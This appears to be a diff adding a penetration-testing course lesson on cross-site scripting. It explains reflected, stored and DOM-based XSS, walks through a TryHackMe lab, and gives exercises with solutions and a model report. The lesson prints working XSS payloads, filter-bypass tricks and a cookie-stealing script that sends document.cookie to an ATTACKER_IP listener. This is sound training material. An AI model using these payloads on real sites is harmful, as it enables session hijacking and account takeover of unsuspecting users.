@@ -1,0 +1,133 @@
+# Web Module — Lesson 3: Cross-Site Scripting (XSS)
+
+**Methodology phase:** Exploitation, after you've found an input whose value shows up somewhere in a response.
+**Why it matters for PT1:** XSS is a Top 10 staple and appears on the web section. It's the same core idea as SQL injection — *data being treated as code* — but the interpreter is the victim's **browser** instead of a database. Learn one, you understand both.
+
+---
+
+## 1. The concept
+
+XSS happens when an app takes your input and puts it into an HTML page **without encoding it**, so the browser parses your input as markup/script instead of as text.
+
+```php
+// Vulnerable: user's search term echoed straight into the page
+echo "<p>You searched for: " . $_GET['q'] . "</p>";
+```
+
+Send `q=hello` and you get `<p>You searched for: hello</p>`. Harmless.
+Send `q=<script>alert(1)</script>` and the page becomes:
+
+```html
+<p>You searched for: <script>alert(1)</script></p>
+```
+
+The browser doesn't display `<script>` as text — it *runs* it. Your JavaScript now executes in the victim's session, on the app's origin, with access to their cookies, the DOM, and anything they can do.
+
+**Root cause, every time:** output was not encoded for the context it landed in. Say that in remediation and you're right.
+
+---
+
+## 2. The three types you must recognise
+
+| Type | Where the payload lives | Who it hits |
+|---|---|---|
+| **Reflected** | In the request (URL/param), echoed back in *that* response | One victim, via a crafted link you send them |
+| **Stored** | Saved on the server (comment, profile, message), served to *everyone* who views it | Every visitor — highest impact |
+| **DOM-based** | Never touches the server; client-side JS writes your input into the page | Whoever loads the malicious URL |
+
+Stored is the crown jewel — a payload in an admin-viewed field (a support ticket, a username, a log entry) can steal an admin session. On the exam, always ask: *does an admin or another user ever see this field?*
+
+---
+
+## 3. Finding it — the method
+
+1. **Inject a unique marker**, not a payload yet: `q=xss7391`. Then view source and search for `xss7391`. *Where* it lands decides the payload:
+   - Between tags (`<p>HERE</p>`) → try `<script>`, `<img>` payloads.
+   - Inside an attribute (`value="HERE"`) → you must break out of the attribute first: `"><script>...`.
+   - Inside existing JS (`var x = "HERE"`) → break the string: `";alert(1)//`.
+2. **Test with a benign, visible probe** so you don't rely on `alert` being allowed. `<b>xss7391</b>` — if the marker renders **bold**, HTML is being interpreted. That's proof without needing script to fire.
+3. **Confirm script execution** with a payload that survives filters:
+```html
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(document.domain)>
+```
+`document.domain` beats `alert(1)` because it proves *which origin* the script ran on — useful evidence.
+
+> **Why `<img src=x onerror=...>`?** Many apps strip `<script>` but miss event handlers on other tags. `src=x` is a deliberately broken image so `onerror` always fires. This is your go-to when `<script>` gets filtered.
+
+---
+
+## 4. Worked example — reflected to stored, then a cookie steal
+
+Room to do this live: **[TryHackMe — Intro to Cross-site Scripting](https://tryhackme.com/room/xss)**.
+
+**Step 1 — marker.** Search box: `test123`. View source: `<p>Results for test123</p>`. Lands between tags, unencoded.
+
+**Step 2 — benign probe.** `<u>test123</u>` → renders underlined. HTML interpreted. Confirmed reflected XSS.
+
+**Step 3 — fire script.** `<script>alert(document.domain)</script>` → alert pops with the app's domain. Reflected XSS proven.
+
+> **Dead end kept in:** my `<script>` payload came back *encoded* (`&lt;script&gt;`) so nothing fired, and I assumed it was patched. It wasn't — the search box was filtered but the **comment field** (stored) was not. Lesson: one filtered sink doesn't mean the app is safe. Test *every* input, especially ones other users see.
+
+**Step 4 — go stored.** Post a comment: `<script>alert(document.cookie)</script>`. Reload the page (or view as another user) and it fires for *them*. Now it's stored XSS — far higher severity.
+
+**Step 5 — weaponise (steal a session).** Replace the alert with an exfil payload that ships the victim's cookie to a listener you control:
+```html
+<script>new Image().src="http://ATTACKER_IP:8000/c?"+document.cookie</script>
+```
+- `new Image().src=...` — creating an image with a remote `src` fires an HTTP GET to your server with no visible artefact.
+- Start a listener first: `python3 -m http.server 8000`. The victim's cookie arrives in your access log as the query string.
+- With `HttpOnly` set on the cookie, `document.cookie` can't read it — note that in your report as a mitigating control, and pivot to other actions (CSRF-style requests as the victim) instead.
+
+That chain — stored XSS in an admin-viewed field → admin cookie → admin session — is the classic critical-severity web finding.
+
+---
+
+## 5. Filter-bypass basics (know the tells, don't overinvest)
+
+- `<script>` blocked → event handlers: `<img src=x onerror=...>`, `<svg onload=...>`, `<body onload=...>`.
+- Case-sensitive filter → `<ScRiPt>`.
+- Quotes stripped → `String.fromCharCode()` or use payloads that need no quotes.
+- `alert` blacklisted → `prompt()`, `confirm()`, or `alert\x28...\x29` tricks.
+
+On a *junior* exam, deep WAF evasion is rarely the intended path. If a simple payload doesn't work, first re-check the **context** (Section 3) — nine times out of ten the fix is breaking out of an attribute correctly, not exotic evasion.
+
+---
+
+## 6. Exercises
+
+**Exercise 1 — context matters.** Find a reflection inside an HTML attribute (`value="HERE"`). Craft the payload that breaks out and executes. Why did the between-tags payload fail here?
+**Exercise 2 — stored.** Plant a persistent payload in a field another user/admin views. Prove it fires on their page load, not just yours.
+**Exercise 3 — cookie exfil.** Using a local `python3 -m http.server`, capture your *own* test session cookie via a stored payload. (You're simulating the victim — don't attack anyone real.)
+**Exercise 4 — report it.** Write the finding for the stored XSS, explaining why stored outranks reflected and what `HttpOnly`/CSP would have mitigated.
+
+---
+
+<details>
+<summary><b>Solutions & debrief</b></summary>
+
+**Exercise 1.** In `value="HERE"`, a raw `<script>` is already inside a quoted attribute and won't execute. Break out first: `"><script>alert(document.domain)</script>`. The `">` closes the `value` and the tag, dropping you back into HTML where `<script>` is valid. The between-tags payload failed because the browser treated it as attribute text, not markup.
+
+**Exercise 2.** Post `<script>alert(document.domain)</script>` (or an `onerror` variant if filtered) into a comment/profile field. Load the page as a second account or refresh — it executes on their render because the payload is served from storage to every viewer.
+
+**Exercise 3.** Payload: `<script>new Image().src="http://YOUR_IP:8000/c?"+document.cookie</script>`. Run `python3 -m http.server 8000`, trigger the page, and read your own cookie from the server's request log line (`GET /c?session=...`). Evidence for the report = that log line plus the stored payload.
+
+**Exercise 4 — model finding.**
+> **Title:** Stored XSS in comment field leading to session theft (High/Critical).
+> **Endpoint:** `POST /comments`, `body` parameter, rendered on `/thread/{id}`.
+> **Reproduction:** Submit a comment containing `<script>...document.cookie...</script>`. Any user (including admins) who views the thread executes the script; their session cookie is exfiltrated to an attacker-controlled host.
+> **Impact:** Session hijacking of any viewer, including administrators → full account/admin takeover. Stored outranks reflected because it needs no per-victim social engineering — every viewer is hit automatically.
+> **Remediation:** Context-aware output encoding on all user-controlled data; set `HttpOnly` on session cookies (blocks `document.cookie` theft); deploy a Content-Security-Policy to restrict inline script execution.
+
+</details>
+
+---
+
+## 7. Carry forward
+
+- XSS = data-as-code in the *browser*. The context where your input lands dictates the payload — always view source and check first.
+- Stored &gt; reflected &gt; DOM in typical impact, because stored needs no victim interaction beyond a normal page view.
+- `HttpOnly` + CSP + output encoding is the remediation trio. Bank it.
+
+**Next lesson:** `web/04-file-upload-lfi-command-injection.md` — turning file handling and path/command flaws into a shell on the server.
